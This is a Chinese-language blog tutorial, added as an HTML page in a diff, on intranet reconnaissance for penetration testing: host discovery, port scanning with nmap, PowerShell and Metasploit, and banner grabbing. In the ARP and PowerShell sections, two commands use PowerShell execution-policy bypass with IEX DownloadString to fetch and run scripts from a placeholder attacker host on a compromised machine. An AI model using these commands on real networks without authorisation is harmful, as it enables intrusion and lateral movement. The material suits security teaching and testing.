@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="内网资源探测" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            内网资源探测
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%91%E7%8E%B0%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="post-toc-text">发现存活主机</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8EICMP"><span class="post-toc-text">基于ICMP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8ENetBIOS-%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F"><span class="post-toc-text">基于NetBIOS(网络基本输入&#x2F;输出系统)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8EUDP"><span class="post-toc-text">基于UDP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8EAPR"><span class="post-toc-text">基于APR</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8ESMB%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%EF%BC%89"><span class="post-toc-text">基于SMB（服务器消息块）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">内网端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8Telnet%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="post-toc-text">利用Telnet探测端口</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">利用nmap进行端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8PowerShell%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">利用PowerShell进行端口扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8MetaSploit%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="post-toc-text">利用MetaSploit探测内网</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner%E4%BF%A1%E6%81%AF"><span class="post-toc-text">获取端口Banner信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NetCat%E8%8E%B7%E5%8F%96Banner"><span class="post-toc-text">NetCat获取Banner</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%88%A9%E7%94%A8Telnet%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="post-toc-text">利用Telnet获取端口Banner</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BD%BF%E7%94%A8Nmap%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3Banner"><span class="post-toc-text">使用Nmap获取端口Banner</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="发现存活主机"><a href="#发现存活主机" class="headerlink" title="发现存活主机"></a>发现存活主机</h1><p>可以使用ICMP,NetBIOS,UDP,ARP,SNMP,SMB等多种协议。</p>
+<h2 id="基于ICMP"><a href="#基于ICMP" class="headerlink" title="基于ICMP"></a>基于ICMP</h2><blockquote>
+<p>ICMP（Internet Control Message Protocol）Internet控制<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">报文</a>协议。它是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE%E7%B0%87?fromModule=lemma_inlink">TCP&#x2F;IP协议簇</a>的一个子协议，用于在IP<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1?fromModule=lemma_inlink">路由</a>器之间传递控制消息。控制消息是指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A?fromModule=lemma_inlink">网络通</a>不通、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>是否可达、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用</p>
+</blockquote>
+<p>可以通过ICMP循环对整个网段中的每个ip地址执行ping命令，来发现存活的主机</p>
+<p>只有cmd可以，powshell的语法不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012027328.png" title="image-20221201202656380" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012027328.png" alt="image-20221201202656380"></a></p>
+<blockquote>
+<p>&#x2F;L cmd里for循环让变量以递增的方式，1到254，步长为1</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012021980.png" title="image-20221201202108896" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212012021980.png" alt="image-20221201202108896"></a></p>
+<p>-w timeout 指定超时间隔，单位为毫秒。</p>
+<p>-n count 发送 count 指定的 ECHO 数据包数</p>
+</blockquote>
+<h2 id="基于NetBIOS-网络基本输入-输出系统"><a href="#基于NetBIOS-网络基本输入-输出系统" class="headerlink" title="基于NetBIOS(网络基本输入&#x2F;输出系统)"></a>基于NetBIOS(网络基本输入&#x2F;输出系统)</h2><blockquote>
+<p><strong>NetBIOS</strong>，为<strong>网上基本输入输出系统</strong>（英语：Network Basic Input&#x2F;Output System）的缩写，它提供了<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B?fromModule=lemma_inlink">OSI模型</a>中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82?fromModule=lemma_inlink">会话层</a>服务，让在不同计算机上运行的不同<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935?fromModule=lemma_inlink">程序</a>，可以在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91?fromModule=lemma_inlink">局域网</a>中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3?fromModule=lemma_inlink">应用程序接口</a>（API）。几乎所有的局域网都是在netbios协议的基础上工作的。其工作流程就是将正常的机器名解析、查询、应答的过程。在windows中，默认安装tcp&#x2F;ip后会自动安netbios</p>
+<p>实际利用时，向局域网的每个ip地址发生netbios状态查询，可以获得主机名、mac地址等信息</p>
+</blockquote>
+<p>使用NBTScan来扫描windows网络上netbios名称的程序，用于发现内网中存活的主机</p>
+<p>需要将其上传到目标主机</p>
+<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exec 192.168.39.1/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于UDP"><a href="#基于UDP" class="headerlink" title="基于UDP"></a>基于UDP</h2><blockquote>
+<p>[Internet ](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Internet">https://baike.baidu.com/item/Internet</a> &#x2F;272794?fromModule&#x3D;lemma_inlink)协议集支持一个无连接的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8048821?fromModule=lemma_inlink">传输协议</a>，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445?fromModule=lemma_inlink">应用程序</a>提供了一种无需建立连接就可以发送封装的 IP 数据包的方法。</p>
+<p>实际利用中，可以将一个空的udp报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，udp探测就马上得到一个icmp端口无法到达的回应报文，这意味着该主机正在运行。</p>
+<p>如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应</p>
+</blockquote>
+<p>使用Unicornscan,一款kali上的信息收集工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于APR"><a href="#基于APR" class="headerlink" title="基于APR"></a>基于APR</h2><blockquote>
+<p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80?fromModule=lemma_inlink">IP地址</a>获取<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129?fromModule=lemma_inlink">物理地址</a>的一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE?fromModule=lemma_inlink">TCP&#x2F;IP协议</a>。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
+<p>在实际利用中，可以想网络发送一个arp请求，若目标主机处于活跃状态，则一定会回应一个arp响应，否则不会做出任何回应</p>
+</blockquote>
+<ul>
+<li><p>ARP-Scan</p>
+<p>利用arp发现内网中存活的主机，将其上传到目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PowerShell</p>
+<p>Empire渗透框架的Invoke-ARPScan.psl脚本。使用时需要将脚本导入执行</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">Invoke-ARPScan</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-Module .\Invoke-ARPScan.psl</span><br><span class="line">invoke-ARPScan -CIDR 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>也可以将脚本代码托管在服务器上，通过powershell远程加载运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://you-ip:port/Invoke-ARPScan.psl&#x27;);Invoke-ARPScan -CIDR 10.10.10.0/24&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="基于SMB（服务器消息块）"><a href="#基于SMB（服务器消息块）" class="headerlink" title="基于SMB（服务器消息块）"></a>基于SMB（服务器消息块）</h2><blockquote>
+<p>SMB(全称是Server Message Block)是一个网络<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE/13020269?fromModule=lemma_inlink">协议</a>名，它能被用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web/150564?fromModule=lemma_inlink">Web</a>连接和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081?fromModule=lemma_inlink">客户端</a>与服务器之间的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E6%B2%9F%E9%80%9A/1053012?fromModule=lemma_inlink">信息沟通</a>。</p>
+<p>是一种应用层传输协议，主要是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。</p>
+<p>CIFS消息一般使用NetBIOS或TCP发送，分别使用139或者445端口，目前倾向于使用445端口</p>
+<p>实际利用中可以探测局域网中存在的SMB服务来发现存活主机，多适用于windows</p>
+</blockquote>
+<p>CrackMapExec(简称CME)</p>
+<p>在kali上使用，可以枚举登录用户、枚举smb服务列表、执行winrm攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.30.0/24 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212291954829.png" title="image-20221229195436707" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212291954829.png" alt="image-20221229195436707"></a></p>
+<h1 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h1><h2 id="利用Telnet探测端口"><a href="#利用Telnet探测端口" class="headerlink" title="利用Telnet探测端口"></a>利用Telnet探测端口</h2><p>Telnet是进行远程登录的标志协议和主要方式。可以用telnet进行简单测试指定的端口号是打开还是关闭状态</p>
+<p>3389是windows远程桌面服务的默认端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.30.10 3389</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用nmap进行端口扫描"><a href="#利用nmap进行端口扫描" class="headerlink" title="利用nmap进行端口扫描"></a>利用nmap进行端口扫描</h2><p><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/">官方文档</a></p>
+<p>扫描指定端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,88 192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<p>扫描所有开发的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<p>扫描指定端口并获得端口上开放的服务版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135  192.168.30.30</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301441995.png" title="image-20221230144101927" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301441995.png" alt="image-20221230144101927"></a></p>
+<h2 id="利用PowerShell进行端口扫描"><a href="#利用PowerShell进行端口扫描" class="headerlink" title="利用PowerShell进行端口扫描"></a>利用PowerShell进行端口扫描</h2><p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">NiShang</a>是基于Powershell的渗透测试专用框架集成了各种脚本和payload</p>
+<p>其中的Scan模块有个<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">Invoke0PortCan.psl</a>脚本，可以用来对主机进行端口扫描</p>
+<p>要先将这些文件下载下来，并且导入才能使用</p>
+<p>对一个主机范围进行默认的端口扫描</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-PortScan</span> <span class="literal">-StartAddress</span> <span class="number">192.168</span>.<span class="number">30.10</span> <span class="literal">-EndAddress</span> <span class="number">192.168</span>.<span class="number">30.30</span> <span class="literal">-ResolveHost</span> <span class="literal">-ScanPort</span></span><br></pre></td></tr></table></figure>
+
+<p>在拿到一台内网机器控制权时，可以执行以下命令来下载并扫描指定端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-portscan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.30 -ResolveHost -ScanPort -Port 80,88&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="利用MetaSploit探测内网"><a href="#利用MetaSploit探测内网" class="headerlink" title="利用MetaSploit探测内网"></a>利用MetaSploit探测内网</h1><p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">MetaSploit</a>渗透框架中内置了几款资源搜集模块，可以用于探测内网服务、发现内网存活主机、对目标主机进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">user auxiliary/scanner/netbios/nbanme</span><br><span class="line"><span class="built_in">set</span> RHOST 192.68.30.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301541396.png" title="image-20221230154131331" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301541396.png" alt="image-20221230154131331"></a></p>
+<h1 id="获取端口Banner信息"><a href="#获取端口Banner信息" class="headerlink" title="获取端口Banner信息"></a>获取端口Banner信息</h1><p>Banner中可能包含一些敏感信息，通过查看端口的Banner，往往可以获取软件开发商。软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用</p>
+<h2 id="NetCat获取Banner"><a href="#NetCat获取Banner" class="headerlink" title="NetCat获取Banner"></a>NetCat获取Banner</h2><p>-nv 选项可以在连接指定的端口时获取该端口的Banner信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301547307.png" title="image-20221230154728273" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301547307.png" alt="image-20221230154728273"></a></p>
+<h2 id="利用Telnet获取端口Banner"><a href="#利用Telnet获取端口Banner" class="headerlink" title="利用Telnet获取端口Banner"></a>利用Telnet获取端口Banner</h2><p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用Nmap获取端口Banner"><a href="#使用Nmap获取端口Banner" class="headerlink" title="使用Nmap获取端口Banner"></a>使用Nmap获取端口Banner</h2><p>在namp中指定脚本”–script&#x3D;banner” ,可以在端口扫描过程中获取端口的Banner</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=banner -p 1-200 192.168.30.10 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301555943.png" title="image-20221230155537905" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212301555943.png" alt="image-20221230155537905"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/'>
+                            信息搜集
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/'>
+                            内网渗透
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
